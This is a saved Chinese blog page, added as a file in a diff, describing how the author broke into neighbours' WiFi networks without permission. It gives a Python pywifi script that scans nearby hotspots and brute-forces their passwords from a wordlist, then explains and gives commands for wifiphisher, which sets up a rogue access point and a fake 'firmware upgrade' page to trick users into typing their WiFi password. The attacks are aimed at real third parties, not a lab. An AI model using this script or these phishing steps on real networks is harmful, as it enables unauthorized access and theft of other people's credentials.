@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="前言最近在家，由于某些原因家里还没网。老是去别人家蹭，都不好意思了。也试着跑隔壁的弱口令，但是没解决，想跑Pin吧，但是没环境。几经挫折，最后终于拿下了，可是信号好差…… 概述其实，我们蹭到隔壁无线的方法，最笨的有咱们可以跑跑字典阿，试试弱口令阿，实在不行，咱们可以利用Kali下的工具跑跑Pin码，甚至做一些更猥琐的事情。比如下面的内容。 0x01 跑字典一开始我试了几个弱口令，但是虽然是小村子，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="蹭隔壁的WiFI">
+<meta property="og:url" content="https://bestwing.me/WiFi_Attack.html">
+<meta property="og:site_name" content="Swing&#39;Blog 有恨无人省">
+<meta property="og:description" content="前言最近在家，由于某些原因家里还没网。老是去别人家蹭，都不好意思了。也试着跑隔壁的弱口令，但是没解决，想跑Pin吧，但是没环境。几经挫折，最后终于拿下了，可是信号好差…… 概述其实，我们蹭到隔壁无线的方法，最笨的有咱们可以跑跑字典阿，试试弱口令阿，实在不行，咱们可以利用Kali下的工具跑跑Pin码，甚至做一些更猥琐的事情。比如下面的内容。 0x01 跑字典一开始我试了几个弱口令，但是虽然是小村子，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://camo.githubusercontent.com/a5c1a17024a880122d4fa0c825f60112eda5d79f/68747470733a2f2f736f7068726f6e2e6769746875622e696f2f77696669706869736865722f7373352e706e67">
+<meta property="og:image" content="https://camo.githubusercontent.com/edac2b531e778d7c1e899743e5aecda7e322e1b5/68747470733a2f2f736f7068726f6e2e6769746875622e696f2f77696669706869736865722f7373322e706e67">
+<meta property="article:published_time" content="2017-02-12T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-02-16T17:10:31.000Z">
+<meta property="article:author" content="Swing">
+<meta property="article:tag" content="WiFi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://camo.githubusercontent.com/a5c1a17024a880122d4fa0c825f60112eda5d79f/68747470733a2f2f736f7068726f6e2e6769746875622e696f2f77696669706869736865722f7373352e706e67">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>蹭隔壁的WiFI</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 有恨无人省" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/Memory-Leak-with-DynELF.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/Those-of-the-Breakpoint.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/WiFi_Attack.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/WiFi_Attack.html&text=蹭隔壁的WiFI"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/WiFi_Attack.html&title=蹭隔壁的WiFI"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/WiFi_Attack.html&is_video=false&description=蹭隔壁的WiFI"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=蹭隔壁的WiFI&body=Check out this article: https://bestwing.me/WiFi_Attack.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/WiFi_Attack.html&title=蹭隔壁的WiFI"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/WiFi_Attack.html&title=蹭隔壁的WiFI"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/WiFi_Attack.html&title=蹭隔壁的WiFI"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/WiFi_Attack.html&title=蹭隔壁的WiFI"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/WiFi_Attack.html&name=蹭隔壁的WiFI&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/WiFi_Attack.html&t=蹭隔壁的WiFI"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E8%B7%91%E5%AD%97%E5%85%B8"><span class="toc-number">3.</span> <span class="toc-text">0x01 跑字典</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-wifiphisher"><span class="toc-number">4.</span> <span class="toc-text">0x02 wifiphisher</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        蹭隔壁的WiFI
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Swing'Blog 有恨无人省</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-02-12T16:00:00.000Z" itemprop="datePublished">2017-02-13</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Summary/">Summary</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/WiFi/" rel="tag">WiFi</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在家，由于某些原因家里还没网。老是去别人家蹭，都不好意思了。也试着跑隔壁的弱口令，但是没解决，想跑Pin吧，但是没环境。几经挫折，最后终于拿下了，可是信号好差……</p>
+<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>其实，我们蹭到隔壁无线的方法，最笨的有咱们可以跑跑字典阿，试试弱口令阿，实在不行，咱们可以利用Kali下的工具跑跑Pin码，甚至做一些更猥琐的事情。比如下面的内容。</p>
+<h1 id="0x01-跑字典"><a href="#0x01-跑字典" class="headerlink" title="0x01 跑字典"></a>0x01 跑字典</h1><p>一开始我试了几个弱口令，但是虽然是小村子，但是隔壁的wifi还是不少，我总不能一个一个试吧，这一点都不优雅，所以想到之前看到的python的一个模块，叫<strong>pywifi</strong>。得 咱们写一个脚本来跑跑密码吧。</p>
+<p>关键代码如下<br><strong>热点扫描</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scans</span>(<span class="params">face,timeout</span>):</span></span><br><span class="line">    <span class="comment">#开始扫描</span></span><br><span class="line">    face.scan()</span><br><span class="line">    time.sleep(timeout)</span><br><span class="line">    <span class="comment">#在若干秒后获取扫描结果</span></span><br><span class="line">    <span class="keyword">return</span> face.scan_results()</span><br></pre></td></tr></table></figure>
+<p><strong>热点攻击</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">i,face,x,key,stu,ts</span>):</span></span><br><span class="line">    <span class="comment">#显示对应网络名称，考虑到部分中文名啧显示bssid</span></span><br><span class="line">    showID = x.bssid <span class="keyword">if</span> len(x.ssid)&gt;len(x.bssid) <span class="keyword">else</span> x.ssid</span><br><span class="line">    <span class="comment">#迭代字典并进行爆破</span></span><br><span class="line">    <span class="keyword">for</span> n,k <span class="keyword">in</span> enumerate(key):</span><br><span class="line">        x.key = k.strip()</span><br><span class="line">        <span class="comment">#移除所有热点配置</span></span><br><span class="line">        face.remove_all_network_profiles()</span><br><span class="line">        <span class="comment">#讲封装好的目标尝试连接</span></span><br><span class="line">        face.connect(face.add_network_profile(x))</span><br><span class="line">        <span class="comment">#初始化状态码，考虑到用0会发生些逻辑错误</span></span><br><span class="line">        code = <span class="number">10</span></span><br><span class="line">        t1 = time.time()</span><br><span class="line">        <span class="comment">#循环刷新状态，如果置为0则密码错误，如超时则进行下一个</span></span><br><span class="line">        <span class="keyword">while</span> code!=<span class="number">0</span> :</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            code = face.status()</span><br><span class="line">            now = time.time()-t1</span><br><span class="line">            <span class="keyword">if</span> now&gt;ts:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            stu.write(<span class="string">&quot;\r%-*s| %-*s| %s |%*.2fs| %-*s |  %-*s %*s&quot;</span>%(<span class="number">6</span>,i,<span class="number">18</span>,showID,code,<span class="number">5</span>,now,<span class="number">7</span>,x.signal,<span class="number">10</span>,len(key)-n,<span class="number">10</span>,k.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)))</span><br><span class="line">            stu.flush()</span><br><span class="line">            <span class="keyword">if</span> code == <span class="number">4</span>:</span><br><span class="line">                face.disconnect()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;%-*s| %s | %*s |%*s\n&quot;</span>%(<span class="number">20</span>,x.ssid,x.bssid,<span class="number">3</span>,x.signal,<span class="number">15</span>,k)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment">#扫描时常</span></span><br><span class="line">    scantimes = <span class="number">3</span></span><br><span class="line">    <span class="comment">#单个密码测试延迟</span></span><br><span class="line">    testtimes = <span class="number">15</span></span><br><span class="line">    output = sys.stdout</span><br><span class="line">    <span class="comment">#结果文件保存路径</span></span><br><span class="line">    files = <span class="string">&quot;TestRes.txt&quot;</span></span><br><span class="line">    <span class="comment">#字典列表</span></span><br><span class="line">    keys = open(sys.argv[<span class="number">1</span>],<span class="string">&quot;r&quot;</span>).readlines()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;|KEYS %s&quot;</span>%(len(keys))</span><br><span class="line">    <span class="comment">#实例化一个pywifi对象</span></span><br><span class="line">    wifi = PyWiFi()</span><br><span class="line">    <span class="comment">#选择定一个网卡并赋值于iface</span></span><br><span class="line">    iface = wifi.interfaces()[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#通过iface进行一个时常为scantimes的扫描并获取附近的热点基础配置</span></span><br><span class="line">    scanres = scans(iface,scantimes)</span><br><span class="line">    <span class="comment">#统计附近被发现的热点数量</span></span><br><span class="line">    nums = len(scanres)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;|SCAN GET %s&quot;</span>%(nums)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;%s\n%-*s| %-*s| %-*s| %-*s | %-*s | %-*s %*s \n%s&quot;</span>%(<span class="string">&quot;-&quot;</span>*<span class="number">70</span>,<span class="number">6</span>,<span class="string">&quot;WIFIID&quot;</span>,<span class="number">18</span>,<span class="string">&quot;SSID OR BSSID&quot;</span>,<span class="number">2</span>,<span class="string">&quot;N&quot;</span>,<span class="number">4</span>,<span class="string">&quot;time&quot;</span>,<span class="number">7</span>,<span class="string">&quot;signal&quot;</span>,<span class="number">10</span>,<span class="string">&quot;KEYNUM&quot;</span>,<span class="number">10</span>,<span class="string">&quot;KEY&quot;</span>,<span class="string">&quot;=&quot;</span>*<span class="number">70</span>)</span><br><span class="line">    <span class="comment">#将每一个热点信息逐一进行测试</span></span><br><span class="line">    <span class="keyword">for</span> i,x <span class="keyword">in</span> enumerate(scanres):</span><br><span class="line">        <span class="comment">#测试完毕后，成功的结果讲存储到files中</span></span><br><span class="line">        res = test(nums-i,iface,x,keys,output,testtimes)</span><br><span class="line">        <span class="keyword">if</span> res:</span><br><span class="line">            open(files,<span class="string">&quot;a&quot;</span>).write(res)</span><br></pre></td></tr></table></figure>
+<p><em>作者：面包君<br>链接：<a href="https://zhuanlan.zhihu.com/p/25149544">https://zhuanlan.zhihu.com/p/25149544</a></em></p>
+<p>但是一点软用都没有，没辙，难道我也要去跑Pin码吗？但是峰回路转，我看到这篇文章附赠了一个链接。</p>
+<h1 id="0x02-wifiphisher"><a href="#0x02-wifiphisher" class="headerlink" title="0x02 wifiphisher"></a>0x02 wifiphisher</h1><p><strong>主要原理</strong></p>
+<ul>
+<li>创建一个伪AP来“狸猫换太子”，然后撤销用户AP的授权，</li>
+<li>通知用户需要进行“固件升级”，需要重新验证密码。你的假AP由于具有相同的SSID，用户便会“交代”密码。</li>
+<li>这样你就能得到用户的密码，并且让用户采用你的伪AP做为自己的接入点。而对方一无所知。</li>
+</ul>
+<p>从文章的介绍来看，是有相似的脚本的，比如它所提到的<code>Airsnaf</code>，不过这里文章所说的是Wifiphisher<br>Github源码 <a href="https://github.com/sophron/wifiphisher/releases/">链接</a><br><strong>安装</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/sophron/wifiphisher.git <span class="comment"># Download the latest revision</span></span><br><span class="line"><span class="built_in">cd</span> wifiphisher <span class="comment"># Switch to tool&#x27;s directory</span></span><br><span class="line">sudo python setup.py install <span class="comment"># Install any dependencies (Currently, hostapd, dnsmasq, PyRIC, blessings) </span></span><br></pre></td></tr></table></figure>
+<p><strong>Usage</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifiphisher -aI wlan0 -jI wlan4 -p firmware-upgrade</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wifiphisher --essid CONFERENCE_WIFI -p plugin_update -pK s3cr3tp4ssw0rd</span><br></pre></td></tr></table></figure>
+<p><img src="https://camo.githubusercontent.com/a5c1a17024a880122d4fa0c825f60112eda5d79f/68747470733a2f2f736f7068726f6e2e6769746875622e696f2f77696669706869736865722f7373352e706e67"><br><img src="https://camo.githubusercontent.com/edac2b531e778d7c1e899743e5aecda7e322e1b5/68747470733a2f2f736f7068726f6e2e6769746875622e696f2f77696669706869736865722f7373322e706e67"></p>
+<p>更多详细资料 <a href="https://github.com/sophron/wifiphisher">项目地址</a><br><a href="http://www.leiphone.com/news/201510/bKHbxozIz7zyYCFy.html">文章地址</a></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E8%B7%91%E5%AD%97%E5%85%B8"><span class="toc-number">3.</span> <span class="toc-text">0x01 跑字典</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-wifiphisher"><span class="toc-number">4.</span> <span class="toc-text">0x02 wifiphisher</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/WiFi_Attack.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/WiFi_Attack.html&text=蹭隔壁的WiFI"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/WiFi_Attack.html&title=蹭隔壁的WiFI"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/WiFi_Attack.html&is_video=false&description=蹭隔壁的WiFI"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=蹭隔壁的WiFI&body=Check out this article: https://bestwing.me/WiFi_Attack.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/WiFi_Attack.html&title=蹭隔壁的WiFI"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/WiFi_Attack.html&title=蹭隔壁的WiFI"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/WiFi_Attack.html&title=蹭隔壁的WiFI"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/WiFi_Attack.html&title=蹭隔壁的WiFI"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/WiFi_Attack.html&name=蹭隔壁的WiFI&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/WiFi_Attack.html&t=蹭隔壁的WiFI"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    Swing
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-133464311-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'swing';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
